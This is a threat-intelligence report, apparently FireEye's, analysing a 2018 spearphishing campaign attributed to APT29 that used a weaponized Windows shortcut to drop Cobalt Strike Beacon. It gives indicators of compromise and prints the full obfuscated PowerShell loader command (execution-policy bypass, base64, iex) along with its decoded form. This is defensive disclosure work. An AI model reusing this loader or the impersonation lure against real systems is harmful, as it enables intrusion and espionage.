The phishing emails were made to look like secure communication from a Public Affairs\nofficial at the U.S. Department of State, hosted on a page made to look like another Department of State Public Affairs official's personal\ndrive, and used a legitimate Department of State form as a decoy. This information could be obtained via publicly available data, and\nthere is no indication that the Department of State network was involved in this campaign. The attacker used unique links in each\n\n\n-----\n\nphishing email and the links that FireEye observed were used to download a ZIP archive that contained a weaponized Windows shortcut\nfile, launching both a benign decoy document and a Cobalt Strike Beacon backdoor, customized by the attacker to blend in with legitimate\nnetwork traffic.\n\nSeveral elements from this campaign – including the resources invested in the phishing email and network infrastructure,\nthe metadata from the weaponized shortcut file payload, and the specific victim individuals and organizations targeted – are directly linked\nto the last observed APT29 phishing campaign from November 2016. This blog post explores those technical breadcrumbs and the\npossible intentions of this activity.\n\n**Attribution Challenges**\n\nConclusive FireEye attribution is often obtained through our Mandiant consulting team's investigation of incidents at compromised\norganizations, to identify details of the attack and post-compromise activity at victims. FireEye is still analyzing this activity.\n\nThere are several similarities and technical overlaps between the 14 November 2018, phishing campaign and the suspected APT29\nphishing campaign on 9 November 2016, both of which occurred shortly after U.S. elections. However, the new campaign included\ncreative new elements as well as a seemingly deliberate reuse of old phishing tactics, techniques and procedures (TTPs), including using\nthe same system to weaponize a Windows shortcut (LNK) file. APT29 is a sophisticated actor, and while sophisticated actors are not\ninfallible, seemingly blatant mistakes are cause for pause when considering historical uses of deception by Russian intelligence services.\nIt has also been over a year since we have conclusively identified APT29 activity, which raises questions about the timing and the\nsimilarities of the activity after such a long interlude.\n\nNotable similarities between this and the 2016 campaign include the Windows shortcut metadata, targeted organizations and specific\nindividuals, phishing email construction, and the use of compromised infrastructure. Notable differences include the use of Cobalt Strike,\nrather than custom malware; however, many espionage actors do use publicly and commercially available frameworks for reasons such\nas plausible deniability.\n\nDuring the phishing campaign, there were indications that the site hosting the malware was selectively serving payloads. For example,\n[requests using incorrect HTTP headers reportedly served ZIP archives containing only the benign publicly available Department of State](https://twitter.com/TheCyberSecExp/status/1063477661169827846)\nform. It is possible that the threat actor served additional and different payloads depending on the link visited; however, FireEye has only\nobserved two: the benign and Cobalt Strike variations.\n\nWe provide details of this in the activity summary. Analysis of the campaign is ongoing, and we welcome any additional information from\nthe community.\n\n**Activity Summary**\n\nThe threat actor crafted the phishing emails to masquerade as a U.S. Department of State Public Affairs official sharing an official\ndocument. The links led to a ZIP archive that contained a weaponized Windows shortcut file hosted on a likely compromised legitimate\ndomain, jmj[.].com. The shortcut file was crafted to execute a PowerShell command that read, decoded, and executed additional code\nfrom within the shortcut file.\n\nUpon execution, the shortcut file dropped a benign, publicly available, U.S. Department of State form and Cobalt Strike Beacon. Cobalt\nStrike is a commercially available post-exploitation framework. The BEACON payload was configured with a modified variation of the\n[publicly available \"Pandora\" Malleable C2 Profile and used a command and control (C2) domain – pandorasong[.]com – assessed to be a](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/pandora.profile)\nmasquerade of the Pandora music streaming service. The customization of the C2 profile may have been intended to defeat less resilient\nnetwork detection methods dependent on the default configurations. The shortcut metadata indicates it was built on the same or very\nsimilar system as the shortcut used in the November 2016 campaign. The decoy content is shown in Figure 1.\n\n\n-----\n\nDecoy document content\n\n\nFigure 1: Decoy document content\n\n**Similarities to Older Activity**\n\nThis activity has TTP and targeting overlap with previous activity, suspected to be APT29. The malicious LNK used in the recent\nspearphishing campaign, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), has technical overlaps with a suspected APT29 LNK\nfrom November 2016, 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk (MD5: f713d5df826c6051e65f995e57d6817d),\n[which was publicly reported by Volexity. The 2018 and 2016 LNK files are similar in structure and code, and contain significant metadata](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/)\noverlap, including the MAC address of the system on which the LNK was created.\n\nAdditional overlap was observed in the targeting and tactics employed in the phishing campaigns responsible for distributing these LNK\nfile. Previous APT29 activity targeted some of the same recipients of this email campaign, and APT29 has leveraged large waves of\nemails in previous campaigns.\n\n**Outlook and Implications**\n\nAnalysis of this activity is ongoing, but if the APT29 attribution is strengthened, it would be the first activity uncovered from this\nsophisticated group in at least a year. Given the widespread nature of the targeting, organizations that have previously been targeted by\nAPT29 should take note of this activity. For network defenders, whether or not this activity was conducted by APT29 should be secondary\nto properly investigating the full scope of the intrusion, which is of critical importance if the elusive and deceptive APT29 operators indeed\nhad access to your environment.\n\n## Technical Details\n\n**Phishing**\n\nEmails were sent from DOSOneDriveNotifications-svCTMailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa15382822aa25821925a0245@northshorehealthgm[.]org\nwith the subject Stevenson, Susan N shared \"TP18-DS7002 (UNCLASSIFIED)\" with you. The distribution of emails varied significantly\nbetween the affected organizations. While most targeted FireEye customers received three or fewer emails, some received significantly\nmore, with one customer receiving 136.\n\nEach phishing email contained a unique malicious URL, likely for tracking victim clicks. The pattern of this URL is shown in Figure 2.\n\n\n-----\n\nMalicious URL structure\n\n\nFigure 2: Malicious URL structure\n\nOutside of the length of the sender email address, which may have been truncated on some recipient email clients, the attacker made\nlittle effort to hide the true source of the emails, including that they were not actually sent from the Department of State. Figure 3 provides\na redacted snapshot of email headers from the phishing message.\n\n\nRedacted email headers\n\n\nFigure 3: Redacted email headers\n\n\n-----\n\nThe malicious links are known to have served two variants of the file ds7002.zip. The first variant (MD5:\n3fccf531ff0ae6fedd7c586774b17a2d), contained ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c). ds7002.lnk was a malicious\nshortcut (LNK) file that contained an embedded BEACON DLL and decoy PDF, and was crafted to launch a PowerShell command. On\nexecution, the PowerShell command extracted and executed the Cobalt Strike BEACON backdoor and decoy PDF. The other observed\nvariant of ds7002.zip (MD5: 658c6fe38f95995fa8dc8f6cfe41df7b) contained only the benign decoy document. The decoy document\nds7002.pdf (MD5: 313f4808aa2a2073005d219bc68971cd) appears to have been downloaded from\nhxxps://eforms.state.gov/Forms/ds7002.PDF.\n\nThe BEACON backdoor communicated with the C2 domain pandorasong[.]com (95.216.59[.]92). The domain leveraged privacy\nprotection, but had a start of authority (SOA) record containing vleger@tutanota.com.\n\nOur analysis indicates that the attacker started configuring infrastructure approximately 30 days prior to the attack. This is a significantly\nlonger delay than many other attackers we track. Table 1 contains a timeline of this activity.\n\n**Time** **Event** **Source**\n\n2018-10-15 15:35:19Z pandorasong[.]com registered Registrant Information\n\n2018-10-15 17:39:00Z pandorasong[.]com SSL certificate established Certificate Transparency\n\n2018-10-15 18:52:06Z Cobalt Strike server established Scan Data\n\n2018-11-02 10:25:58Z LNK Weaponized LNK Metadata\n\n2018-11-13 17:58:41Z 3fccf531ff0ae6fedd7c586774b17a2d modified Archive Metadata\n\n2018-11-14 01:48:34Z 658c6fe38f95995fa8dc8f6cfe41df7b modified Archive Metadata\n\n2018-11-14 08:23:10Z First observed phishing e-mail sent Telemetry\n\nTable 1: Operational timeline\n\n**Execution**\n\nUpon execution of the malicious LNK, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), the following PowerShell command was\nexecuted:\n\n\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -ep bypass\n\n$zk='JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5\n\nrIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0ZW0gLVBhdGggJE\n\nVudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lmICgtbm90ICRvZSkge2V4aXR9W\n\n0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJG9lLkRpcmVjdG9yeU5hbWUp\n\nO30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJHRiLCdPcGVuJywnUmVhZCcsJ\n\n1JlYWRXcml0ZSc7JG9lPU5ldy1PYmplY3QgYnl0ZVtdKCR2Y3EtJHB0Z3QpOyRyPSR2en\n\nZpLlNlZWsoJHB0Z3QsW0lPLlNlZWtPcmlnaW5dOjpCZWdpbik7JHI9JHZ6dmkuUmVhZC\n\ngkb2UsMCwkdmNxLSRwdGd0KTskb2U9W0NvbnZlcnRdOjpGcm9tQmFzZTY0Q2hhckFy\n\ncmF5KCRvZSwwLCRvZS5MZW5ndGgpOyR6az1bVGV4dC5FbmNvZGluZ106OkFTQ0lJL\n\nkdldFN0cmluZygkb2UpO2lleCAkems7';$fz='FromBase'+0x40+'String';$rhia=[Text.E\n\nncoding]::ASCII.GetString([Convert]::$fz.Invoke($zk));iex $rhia;\n\nThis command included some specific obfuscation, which may indicate attempts to bypass specific detection logic.

The embedded PowerShell code decoded to\nthe following:\n\n$ptgt=0x0005e2be;\n\n$vcq=0x000623b6;\n\n$tb=\"ds7002.lnk\";\n\nif (-not(Test-Path $tb))\n\n\n-----\n\n{\n$oe=Get-ChildItem -Path $Env:temp -Filter $tb -Recurse;\nif (-not $oe)\n{\nexit\n}\n\n[IO.Directory]::SetCurrentDirectory($oe.DirectoryName);\n}\n$vzvi=New-Object IO.FileStream $tb,'Open','Read','ReadWrite';\n$oe=New-Object byte[]($vcq-$ptgt);\n$r=$vzvi.Seek($ptgt,[IO.SeekOrigin]::Begin);\n$r=$vzvi.Read($oe,0,$vcq-$ptgt);\n$oe=[Convert]::FromBase64CharArray($oe,0,$oe.Length);\n$zk=[Text.Encoding]::ASCII.GetString($oe);\niex $zk;\n\nWhen the decoded PowerShell is compared to the older 2016 PowerShell embedded loader (Figure 4), it's clear that similarities still exist.\nHowever, the new activity leverages randomized variable and function names, as well as obfuscating strings contained in the script.\n\n\nShared functions to loader in older activity (XOR decode function and CopyFilePart)\n\n\nFigure 4: Shared functions to loader in older\n\nactivity (XOR decode function and CopyFilePart)\nThe PowerShell loader code is obfuscated, but a short de-obfuscated snippet is shown as follows.
